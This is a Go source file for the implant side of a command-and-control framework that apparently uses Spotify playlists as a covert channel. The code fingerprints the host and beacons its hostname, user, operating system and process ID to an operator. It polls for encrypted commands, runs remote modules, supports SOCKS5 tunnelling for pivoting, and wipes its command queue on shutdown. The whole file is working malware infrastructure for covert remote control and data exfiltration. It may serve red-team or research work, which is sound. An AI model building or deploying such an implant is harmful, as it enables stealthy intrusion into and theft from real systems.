package c2

import (
	"context"
	"crypto/ecdh"
	"crypto/hmac"
	crand "crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/crypto"
	"github.com/sourcefrenchy/spotexfil/internal/protocol"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
)

// Implant polls for commands and executes them.
type Implant struct {
	client *spotify.Client
	// NOTE: key is a Go string — it cannot be reliably wiped from
	// memory (immutable, GC copies it). Only []byte session keys are
	// zeroed (see zeroKey).
	key             string
	interval        int
	jitter          int
	quiet           bool            // suppress non-error output
	allowedModules  map[string]bool // nil = all modules allowed
	processedSeqs   map[int]bool
	checkinPending  bool
	readFails       int // consecutive READ failures (polling)
	writeFails      int // consecutive WRITE failures (checkin/results)
	sessionID       string
	clientID        string
	lastCheckin     time.Time     // when last checkin was sent
	checkinInterval time.Duration // how often to re-send heartbeat checkins

	// Async result delivery
	resultCh chan *protocol.C2Message
	seqMu    sync.Mutex
	wg       sync.WaitGroup

	// Forward secrecy via X25519. sessionKey is written by the poll
	// goroutine (key exchange, shutdown reset) and read by the result
	// writer goroutine — guarded by skMu.
	ephPriv    *ecdh.PrivateKey
	ephPub     *ecdh.PublicKey
	skMu       sync.RWMutex
	sessionKey []byte // derived ECDH session key (nil until key exchange)

	// Live session transport (edit-in-place). When live is true, the
	// implant owns a long-lived RES session playlist it updates to send
	// results, and reads the operator's CMD session playlist directly
	// by ID instead of listing. cmdSessionID/cmdTracker/liveReadFails/
	// lastClassicPoll are only touched by the poll goroutine;
	// resSessionID is also read by the result writer goroutine (liveMu).
	live            bool
	resSessionID    string // our live RES session playlist (we update it)
	cmdSessionID    string // operator's live CMD session playlist (we read it)
	cmdTracker      seqTracker
	liveReadFails   int // consecutive direct-GET failures on cmd session
	lastClassicPoll time.Time
	liveMu          sync.Mutex // guards resSessionID
}

// Live-session timing. In live mode both sides still do an occasional
// classic listing pass: the implant to sweep classic cmd playlists and
// (re)discover the operator's session, the operator to pick up classic
// heartbeat checkins and (re)discover the implant's session.
const (
	liveClassicSweepInterval = 120 * time.Second // implant classic sweep
	liveListingInterval      = 60 * time.Second  // operator classic listing
)

// seqTracker dedupes incoming live-session messages by sequence number.
// With edit-in-place transport there is a single mailbox slot, so the
// receiver only ever sees the latest seq; anything older or equal is a
// replay of an already-handled message.
type seqTracker struct {
	lastSeen int
	started  bool
}

// accept reports whether seq should be handled and, if so, records it.
// Negative seqs are control messages (e.g. shutdown) and are never
// deduped.
func (t *seqTracker) accept(seq int) bool {
	if seq < 0 {
		return true
	}
	if !t.started || seq > t.lastSeen {
		t.started = true
		t.lastSeen = seq
		return true
	}
	return false
}

// findLiveSession scans tag-filtered read results for a live-session
// playlist and returns its playlist ID and seq. When several are
// present, the one with the highest seq wins.
func findLiveSession(seqGroups map[int][]protocol.ChunkMeta) (playlistID string, seq int, ok bool) {
	best := -1
	for s, metas := range seqGroups {
		for _, cm := range metas {
			if protocol.IsLiveMeta(cm.Meta) && cm.PlaylistID != "" && s > best {
				best = s
				playlistID = cm.PlaylistID
			}
		}
	}
	return playlistID, best, playlistID != ""
}

// ImplantOptions controls implant behavior.
type ImplantOptions struct {
	Interval       int
	Jitter         int
	Quiet          bool
	Live           bool     // use live-session (edit-in-place) transport
	AllowedModules []string // nil or empty = all modules enabled
}

// NewImplant creates a new implant with default options.
func NewImplant(client *spotify.Client, key string, interval, jitter int) *Implant {
	return NewImplantWithOptions(client, key,
		ImplantOptions{Interval: interval, Jitter: jitter})
}

// NewImplantWithOptions creates a new implant with explicit options.
func NewImplantWithOptions(client *spotify.Client, key string, opts ImplantOptions) *Implant {
	interval, jitter := opts.Interval, opts.Jitter
	// Enforce minimum 20s interval to avoid Spotify rate limits
	if interval < 20 {
		fmt.Printf("[!] Interval %ds too low, setting to 20s "+
			"(Spotify rate limit: ~180 req/30s)\n", interval)
		interval = 20
	}
	if jitter >= interval {
		jitter = interval / 2
	}
	// Generate unique session ID for this run
	sessionBytes := make([]byte, 8)
	crand.Read(sessionBytes)
	sessionID := fmt.Sprintf("%x", sessionBytes)
	clientID := getClientID(key)

	// Generate X25519 ephemeral key pair for forward secrecy
	ephPriv, err := crypto.GenerateX25519()
	if err != nil {
		fmt.Printf("[!] Failed to generate X25519 keypair: %v\n", err)
		fmt.Println("[!] Forward secrecy will not be available")
	}

	var ephPub *ecdh.PublicKey
	if ephPriv != nil {
		ephPub = ephPriv.PublicKey()
	}

	if !opts.Quiet {
		fmt.Printf("\033[36m  Interval : %d-%ds | Session : %s\033[0m\n",
			interval-jitter, interval+jitter, sessionID[:12])
		fmt.Printf("  \033[90mClient ID : %s\033[0m\n", clientID)
		if ephPub != nil {
			fmt.Printf("  \033[90mX25519    : %s\033[0m\n",
				hex.EncodeToString(ephPub.Bytes())[:24]+"...")
		}
		fmt.Println()
	}
	var allowedModules map[string]bool
	if len(opts.AllowedModules) > 0 {
		allowedModules = make(map[string]bool, len(opts.AllowedModules))
		for _, name := range opts.AllowedModules {
			allowedModules[name] = true
		}
	}
	return &Implant{
		client:          client,
		key:             key,
		interval:        interval,
		jitter:          jitter,
		quiet:           opts.Quiet,
		live:            opts.Live,
		allowedModules:  allowedModules,
		processedSeqs:   make(map[int]bool),
		sessionID:       sessionID,
		clientID:        clientID,
		resultCh:        make(chan *protocol.C2Message, 32),
		ephPriv:         ephPriv,
		ephPub:          ephPub,
		checkinInterval: 60 * time.Second, // heartbeat every 60s
	}
}

// getClientID derives a unique client ID from the encryption key +
// machine identity (hostname, user, MAC). The key component ensures
// different operator sessions produce different IDs. The machine
// component ensures different machines are distinguishable.
func getClientID(encryptionKey string) string {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = "unknown"
	}

	// Get first non-loopback MAC address
	mac := "no-mac"
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagLoopback != 0 || len(iface.HardwareAddr) == 0 {
				continue
			}
			mac = iface.HardwareAddr.String()
			break
		}
	}

	h := hmac.New(sha256.New, []byte(encryptionKey))
	h.Write([]byte(hostname + "|" + username + "|" + mac))
	return hex.EncodeToString(h.Sum(nil))[:16]
}

// logf prints a non-error diagnostic message unless quiet mode is on.
// Error/diagnostic prints (those starting with "[!]") use fmt directly
// and stay visible even in quiet mode.
func (imp *Implant) logf(format string, args ...interface{}) {
	if imp.quiet {
		return
	}
	fmt.Printf(format, args...)
}

// getSessionKey returns a copy of the current ECDH session key,
// or nil if forward secrecy has not been established.
func (imp *Implant) getSessionKey() []byte {
	imp.skMu.RLock()
	defer imp.skMu.RUnlock()
	return imp.sessionKey
}

// setSessionKey updates the ECDH session key (nil to reset). The old
// key's bytes are zeroed before replacement so they don't linger in
// the heap until GC.
func (imp *Implant) setSessionKey(key []byte) {
	imp.skMu.Lock()
	defer imp.skMu.Unlock()
	if imp.sessionKey != nil {
		zeroKey(imp.sessionKey)
	}
	imp.sessionKey = key
}

// wipeKeys zeroes the session key bytes (via setSessionKey(nil)).
// Call on shutdown, before os.Exit.
func (imp *Implant) wipeKeys() {
	imp.setSessionKey(nil)
}

// sendCheckin sends a check-in beacon so the operator knows we connected.
func (imp *Implant) sendCheckin() {
	ctx := context.Background()

	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = "unknown"
	}

	checkinData := map[string]interface{}{
		"client_id":  imp.clientID,
		"session_id": imp.sessionID,
		"hostname":   hostname,
		"os":         runtime.GOOS + "/" + runtime.GOARCH,
		"user":       username,
		"pid":        os.Getpid(),
	}

	// Include X25519 public key for forward secrecy negotiation
	if imp.ephPub != nil {
		checkinData["pubkey"] = hex.EncodeToString(imp.ephPub.Bytes())
	}

	dataBytes, _ := json.Marshal(checkinData)
	result := protocol.NewC2Message("checkin", 0)
	result.Status = "ok"
	result.Data = string(dataBytes)
	result.SessionID = imp.sessionID

	encoded, err := protocol.EncodeMessage(result.ToResultMap(), imp.key)
	if err != nil {
		fmt.Printf("[!] Checkin encode failed: %v\n", err)
		return
	}

	chunks, err := protocol.ChunkPayload(encoded, 0,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Checkin chunk failed: %v\n", err)
		return
	}

	err = imp.client.WriteC2Playlists(ctx, chunks)
	if err != nil {
		if isRateLimit(err) {
			retryAfter := parseRetryAfter(err)
			if retryAfter > 3600 {
				fmt.Printf("[!] Spotify WRITE BLOCKED at %s for %s\n"+
					"    Playlist creation is hard-blocked by Spotify.\n"+
					"    This is from earlier rapid API usage. It will auto-lift.\n"+
					"    Implant will keep retrying with backoff.\n",
					time.Now().Format("15:04:05"), formatDuration(retryAfter))
			} else if retryAfter > 0 {
				fmt.Printf("[!] Rate limited at %s, retry after %s\n",
					time.Now().Format("15:04:05"), formatDuration(retryAfter))
			} else {
				fmt.Printf("[!] Rate limited at %s\n",
					time.Now().Format("15:04:05"))
			}
		} else {
			fmt.Printf("[!] Checkin failed at %s: %v\n",
				time.Now().Format("15:04:05"), err)
		}
		imp.checkinPending = true
		return
	}
	imp.logf("\033[32m[+] Check-in sent\033[0m (%s) at %s\n",
		imp.clientID[:8], time.Now().Format("15:04:05"))
	imp.checkinPending = false
	imp.lastCheckin = time.Now()
}

// isRateLimit checks if an error is a Spotify rate limit.
func isRateLimit(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "rate") || strings.Contains(s, "429") || strings.Contains(s, "too many")
}

// isTokenExpired checks if the error is an expired/invalid token.
func isTokenExpired(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "401") || strings.Contains(s, "expired") ||
		strings.Contains(s, "unauthorized") || strings.Contains(s, "invalid access token")
}

// parseRetryAfter extracts seconds from Spotify rate limit error message.
// Spotify errors contain "Retry will occur after: N s" or "Retry-After: N".
func parseRetryAfter(err error) int {
	if err == nil {
		return 0
	}
	s := err.Error()

	// Try "after: N s" pattern
	if idx := strings.Index(s, "after:"); idx >= 0 {
		rest := strings.TrimSpace(s[idx+6:])
		rest = strings.TrimSuffix(rest, " s")
		rest = strings.TrimSuffix(rest, "s")
		rest = strings.Fields(rest)[0]
		var n int
		if _, err := fmt.Sscanf(rest, "%d", &n); err == nil {
			return n
		}
	}
	return 0
}

// formatDuration formats seconds into human-readable duration.
func formatDuration(seconds int) string {
	if seconds < 60 {
		return fmt.Sprintf("%ds", seconds)
	}
	if seconds < 3600 {
		return fmt.Sprintf("%dm%ds", seconds/60, seconds%60)
	}
	h := seconds / 3600
	m := (seconds % 3600) / 60
	return fmt.Sprintf("%dh%dm", h, m)
}

// handleAPIError logs a user-friendly message for Spotify API errors.
// Returns the recommended wait time in seconds (0 = no wait).
func handleAPIError(err error, context string) int {
	if isRateLimit(err) {
		retryAfter := parseRetryAfter(err)
		if retryAfter > 600 {
			fmt.Printf("[!] Spotify rate limit HARD BLOCK (%s): "+
				"retry after %s\n"+
				"    This happens when the API is hit too frequently.\n"+
				"    Increase --interval or wait for the block to lift.\n",
				context, formatDuration(retryAfter))
		} else if retryAfter > 0 {
			fmt.Printf("[!] Spotify rate limited (%s): "+
				"retry after %s\n", context, formatDuration(retryAfter))
		}
		return retryAfter
	}
	if isTokenExpired(err) {
		fmt.Printf("[!] Spotify token expired (%s): "+
			"delete .cache-* and re-authenticate\n", context)
		return 0
	}
	fmt.Printf("[!] Spotify API error (%s): %v\n", context, err)
	return 0
}

// resultWriter drains the result channel and sends results with pacing.
func (imp *Implant) resultWriter() {
	ctx := context.Background()
	for result := range imp.resultCh {
		imp.sendResult(ctx, result)
		time.Sleep(2 * time.Second) // pacing
	}
}

// Run starts the main polling loop.
func (imp *Implant) Run() {
	imp.logf("\033[32m[*] Implant active — polling for commands\033[0m\n")

	// Self-cleanup on exit signal: wipe the incoming command queue and
	// zero the session key before exiting. Note: Go cannot reliably wipe
	// string keys from memory (the GC copies them), so this is
	// best-effort only.
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\n[*] Shutdown signal, cleaning up...")
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()
		_ = imp.client.CleanC2Playlists(ctx, protocol.ChannelCmd, imp.key, -1)
		imp.wipeKeys()
		os.Exit(0)
	}()

	imp.sendCheckin()

	// Live mode: create our long-lived RES session playlist after the
	// initial (classic) checkin so the operator can discover it via the
	// tag-filtered listing.
	if imp.live {
		imp.ensureResSession(context.Background())
	}

	// Start async result writer
	go imp.resultWriter()

	writeBackoffUntil := time.Time{} // when to retry writes

	for {
		// Re-send checkin if:
		// 1. Failed previously (checkinPending)
		// 2. Heartbeat interval elapsed (operator may have restarted)
		needsCheckin := imp.checkinPending ||
			time.Since(imp.lastCheckin) > imp.checkinInterval
		if needsCheckin && time.Now().After(writeBackoffUntil) {
			imp.sendCheckin()
			if imp.checkinPending {
				// Write failed again -- exponential backoff for writes only
				imp.writeFails++
				backoff := 60 * (1 << (imp.writeFails - 1))
				if backoff > 600 {
					backoff = 600
				}
				writeBackoffUntil = time.Now().Add(
					time.Duration(backoff) * time.Second)
				if imp.writeFails <= 3 || imp.writeFails%10 == 0 {
					imp.logf("[*] Write backoff: retry in %s (fail #%d)\n",
						formatDuration(backoff), imp.writeFails)
				}
			} else {
				imp.writeFails = 0
			}
		}

		// Always poll for commands (READ) -- independent of write state
		imp.pollAndExecute()

		// Sleep with jitter (based on READ failures only)
		sleepTime := imp.interval + rand.Intn(2*imp.jitter+1) - imp.jitter
		if imp.readFails > 0 {
			backoff := 30 * (1 << (imp.readFails - 1))
			if backoff > 300 {
				backoff = 300
			}
			sleepTime = backoff
			if imp.readFails <= 3 || imp.readFails%10 == 0 {
				imp.logf("[*] Read backoff: next poll in %s (fail #%d)\n",
					formatDuration(sleepTime), imp.readFails)
			}
		}
		if sleepTime < 10 {
			sleepTime = 10
		}
		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

func (imp *Implant) pollAndExecute() {
	ctx := context.Background()
	if imp.live {
		imp.pollAndExecuteLive(ctx)
		return
	}
	imp.pollAndExecuteClassic(ctx, false)
}

// pollAndExecuteLive polls the operator's CMD session playlist directly
// by ID (1 API call per poll). Falls back to a live-aware classic
// listing pass for discovery, periodic sweeps, and repeated failures.
func (imp *Implant) pollAndExecuteLive(ctx context.Context) {
	if imp.cmdSessionID != "" &&
		time.Since(imp.lastClassicPoll) < liveClassicSweepInterval {
		desc, err := imp.client.GetPlaylistDescription(ctx, imp.cmdSessionID)
		if err == nil {
			imp.liveReadFails = 0
			seq, data, perr := protocol.ParseLiveSessionDesc(desc, imp.key)
			if perr == nil && imp.cmdTracker.accept(seq) {
				imp.handleCommandPayload(seq, data)
			}
			return
		}
		// Direct GET failed: the peer may have rotated/recreated the
		// session playlist. Drop the cached ID to force re-discovery.
		imp.liveReadFails++
		imp.cmdSessionID = ""
		if imp.liveReadFails < 3 {
			return // re-discover on the next cycle
		}
		imp.liveReadFails = 0
		imp.logf("[!] Live session read failing, " +
			"falling back to classic polling this cycle\n")
	} else if imp.cmdSessionID == "" &&
		time.Since(imp.lastClassicPoll) < liveClassicSweepInterval {
		return // nothing discovered yet; wait for the next sweep
	}

	// Discovery / periodic classic sweep (live-aware: adopts the live
	// session playlist instead of deleting it).
	imp.lastClassicPoll = time.Now()
	imp.pollAndExecuteClassic(ctx, true)
}

// pollAndExecuteClassic is the original create/delete polling pass.
// When liveAware is true (live mode's discovery/sweep), live-session
// playlists are adopted for direct reads and never deleted.
func (imp *Implant) pollAndExecuteClassic(ctx context.Context, liveAware bool) {
	seqGroups, err := imp.client.ReadC2Playlists(ctx,
		protocol.ChannelCmd, imp.key, -1)
	if err != nil {
		imp.readFails++
		if isTokenExpired(err) {
			fmt.Printf("[!] Token expired at %s: delete .cache-* and re-authenticate\n",
				time.Now().Format("15:04:05"))
		} else if isRateLimit(err) {
			retryAfter := parseRetryAfter(err)
			if retryAfter > 0 {
				fmt.Printf("[!] Rate limited at %s, server says wait %s\n",
					time.Now().Format("15:04:05"), formatDuration(retryAfter))
				time.Sleep(time.Duration(retryAfter) * time.Second)
				imp.readFails = 0 // reset after honoring the wait
			} else {
				// No Retry-After parsed -- only log first occurrence
				if imp.readFails <= 1 {
					fmt.Printf("[!] Rate limited at %s, backing off\n",
						time.Now().Format("15:04:05"))
				}
			}
		} else {
			fmt.Printf("[!] Poll error at %s: %v\n",
				time.Now().Format("15:04:05"), err)
		}
		return
	}
	imp.readFails = 0 // reset on success

	if len(seqGroups) == 0 {
		return
	}

	if liveAware {
		if id, _, ok := findLiveSession(seqGroups); ok {
			imp.cmdSessionID = id
			imp.logf("[*] Live CMD session discovered (%s)\n", id)
		}
	}

	for seqNum, chunkMetas := range seqGroups {
		// Live session playlist: handle its current content through
		// seq dedupe, but never delete it (the sender owns it).
		if liveAware && len(chunkMetas) > 0 &&
			protocol.IsLiveMeta(chunkMetas[0].Meta) {
			if imp.cmdTracker.accept(seqNum) {
				imp.handleCommandPayload(seqNum,
					protocol.ReassemblePayload(chunkMetas))
			}
			continue
		}

		imp.seqMu.Lock()
		alreadyProcessed := imp.processedSeqs[seqNum]
		imp.seqMu.Unlock()

		if !alreadyProcessed {
			imp.handleCommandPayload(seqNum,
				protocol.ReassemblePayload(chunkMetas))
		}

		_ = imp.client.CleanC2Playlists(ctx,
			protocol.ChannelCmd, imp.key, seqNum)
	}
}

// handleCommandPayload decodes, validates and dispatches one command
// payload: timestamp validation, session binding, shutdown and
// keyexchange handling, and async module execution. It performs no
// playlist cleanup — that is the caller's responsibility (classic mode
// deletes; live mode must not).
func (imp *Implant) handleCommandPayload(seqNum int, payload string) {
	// Try decryption: session key first, then master key
	var cmdDict map[string]interface{}
	if sk := imp.getSessionKey(); sk != nil {
		cmdDict, _ = protocol.DecodeMessageRaw(payload, sk)
	}
	if cmdDict == nil {
		cmdDict, _ = protocol.DecodeMessage(payload, imp.key)
	}
	if cmdDict == nil {
		// Both failed — silently discard (stale from prior session)
		return
	}

	msg := protocol.FromCommandMap(cmdDict)

	// Validate timestamp -- reject stale commands (replay protection)
	age := math.Abs(float64(time.Now().Unix()) - msg.Ts)
	if age > 300 {
		fmt.Printf("[!] Stale command rejected (seq=%d, age=%.0fs)\n", seqNum, age)
		return
	}

	// Validate session ID -- reject commands from stale sessions
	if msg.SessionID != "" && msg.SessionID != imp.sessionID {
		return
	}

	// Handle operator shutdown signal
	if msg.Module == "shutdown" {
		fmt.Printf("\n\033[33m[!] Operator disconnected at %s\033[0m\n",
			time.Now().Format("15:04:05"))
		fmt.Println("\033[33m[!] Waiting for operator to reconnect...\033[0m")
		// Reset forward secrecy (new operator will have different X25519 keys)
		imp.setSessionKey(nil)
		// Force immediate re-checkin so new operator sees us
		imp.checkinPending = true
		imp.lastCheckin = time.Time{}
		imp.seqMu.Lock()
		imp.processedSeqs = make(map[int]bool)
		imp.seqMu.Unlock()
		return
	}

	// Handle key exchange for forward secrecy
	if msg.Module == "keyexchange" {
		imp.handleKeyExchange(msg)
		imp.seqMu.Lock()
		imp.processedSeqs[seqNum] = true
		imp.seqMu.Unlock()
		return
	}

	// Handle tunnel frames (SOCKS5 pivoting)
	if msg.Module == "tunnel" {
		imp.handleTunnelFrame(msg)
		imp.seqMu.Lock()
		imp.processedSeqs[seqNum] = true
		imp.seqMu.Unlock()
		return
	}

	imp.logf("\033[36m[>] Exec\033[0m seq=%d %s\n", seqNum, msg.Module)

	// Async execution: dispatch to goroutine, send result via channel
	imp.wg.Add(1)
	go func(m *protocol.C2Message) {
		defer imp.wg.Done()
		result := imp.execute(m)
		imp.resultCh <- result
	}(msg)

	imp.seqMu.Lock()
	imp.processedSeqs[seqNum] = true
	imp.seqMu.Unlock()
}

// handleKeyExchange processes a keyexchange command from the operator.
func (imp *Implant) handleKeyExchange(msg *protocol.C2Message) {
	if imp.ephPriv == nil {
		fmt.Println("[!] Key exchange failed: no ephemeral key available")
		return
	}

	// Extract operator's public key from pubkey field or args
	peerPubHex := msg.PubKey
	if peerPubHex == "" {
		if pk, ok := msg.Args["pubkey"].(string); ok {
			peerPubHex = pk
		}
	}
	if peerPubHex == "" {
		fmt.Println("[!] Key exchange failed: no peer public key")
		return
	}

	peerPubBytes, err := hex.DecodeString(peerPubHex)
	if err != nil {
		fmt.Printf("[!] Key exchange failed: invalid pubkey hex: %v\n", err)
		return
	}

	peerPub, err := ecdh.X25519().NewPublicKey(peerPubBytes)
	if err != nil {
		fmt.Printf("[!] Key exchange failed: invalid X25519 pubkey: %v\n", err)
		return
	}

	shared, err := imp.ephPriv.ECDH(peerPub)
	if err != nil {
		fmt.Printf("[!] Key exchange failed: ECDH: %v\n", err)
		return
	}

	sessionKey, err := crypto.DeriveSessionKey(shared, imp.key)
	if err != nil {
		fmt.Printf("[!] Key exchange failed: key derivation: %v\n", err)
		return
	}

	imp.setSessionKey(sessionKey)
	imp.logf("\033[32m[+] Forward secrecy established\033[0m at %s\n",
		time.Now().Format("15:04:05"))
}

func (imp *Implant) execute(msg *protocol.C2Message) *protocol.C2Message {
	mod := GetModule(msg.Module)
	if mod == nil {
		return &protocol.C2Message{
			Module:    msg.Module,
			Seq:       msg.Seq,
			Status:    "error",
			Data:      fmt.Sprintf("Unknown module: %s", msg.Module),
			SessionID: imp.sessionID,
		}
	}

	// Module allowlist: lets a demo operator disable noisy modules
	// (e.g. screenshot triggers a macOS Screen Recording prompt).
	if imp.allowedModules != nil && !imp.allowedModules[msg.Module] {
		return &protocol.C2Message{
			Module:    msg.Module,
			Seq:       msg.Seq,
			Status:    "error",
			Data:      fmt.Sprintf("Module disabled on this implant: %s", msg.Module),
			SessionID: imp.sessionID,
		}
	}

	status, data := mod.Execute(msg.Args)
	return &protocol.C2Message{
		Module:    msg.Module,
		Seq:       msg.Seq,
		Status:    status,
		Data:      data,
		SessionID: imp.sessionID,
	}
}

func (imp *Implant) sendResult(ctx context.Context, result *protocol.C2Message) {
	// Use session key for encoding if forward secrecy is established
	var encoded string
	var err error
	if sk := imp.getSessionKey(); sk != nil {
		encoded, err = protocol.EncodeMessageRaw(result.ToResultMap(), sk)
	} else {
		encoded, err = protocol.EncodeMessage(result.ToResultMap(), imp.key)
	}
	if err != nil {
		fmt.Printf("[!] Failed to encode result seq=%d: %v\n", result.Seq, err)
		return
	}

	// Live mode: update our RES session playlist in place (1 API call)
	// when the payload fits in a single description.
	if imp.live && len(encoded) <= shared.Proto.C2.EffectiveChunk {
		if imp.ensureResSession(ctx) {
			imp.liveMu.Lock()
			id := imp.resSessionID
			imp.liveMu.Unlock()
			desc, derr := protocol.LiveSessionDesc(
				protocol.ChannelRes, result.Seq, encoded, imp.key)
			if derr == nil {
				if uerr := imp.client.UpdatePlaylistDescription(ctx, id, desc); uerr == nil {
					imp.logf("\033[90m[<] Result sent seq=%d (live)\033[0m\n",
						result.Seq)
					return
				}
			}
			// Update failed — the session playlist may be gone. Drop
			// it (recreated on next send) and fall back to classic.
			imp.liveMu.Lock()
			imp.resSessionID = ""
			imp.liveMu.Unlock()
		}
	}

	chunks, err := protocol.ChunkPayload(encoded, result.Seq,
		protocol.ChannelRes, imp.key)
	if err != nil {
		fmt.Printf("[!] Failed to chunk result seq=%d: %v\n", result.Seq, err)
		return
	}

	if err := imp.client.WriteC2Playlists(ctx, chunks); err != nil {
		fmt.Printf("[!] Failed to send result seq=%d: %v\n", result.Seq, err)
		return
	}

	imp.logf("\033[90m[<] Result sent seq=%d\033[0m\n", result.Seq)
}

// ensureResSession creates the implant's long-lived RES session
// playlist if it doesn't exist yet. The initial description is a
// live-session beacon (seq 0, empty data) so the operator can discover
// it via the tag-filtered listing. Returns true if the session exists.
func (imp *Implant) ensureResSession(ctx context.Context) bool {
	imp.liveMu.Lock()
	have := imp.resSessionID != ""
	imp.liveMu.Unlock()
	if have {
		return true
	}

	desc, err := protocol.LiveSessionDesc(protocol.ChannelRes, 0, "", imp.key)
	if err != nil {
		return false
	}
	id, err := imp.client.CreateSessionPlaylist(ctx,
		spotify.GenerateCoverName(), desc)
	if err != nil {
		fmt.Printf("[!] Live session playlist create failed: %v\n", err)
		return false
	}
	imp.liveMu.Lock()
	imp.resSessionID = id
	imp.liveMu.Unlock()
	imp.logf("[*] Live RES session playlist created\n")
	return true
}
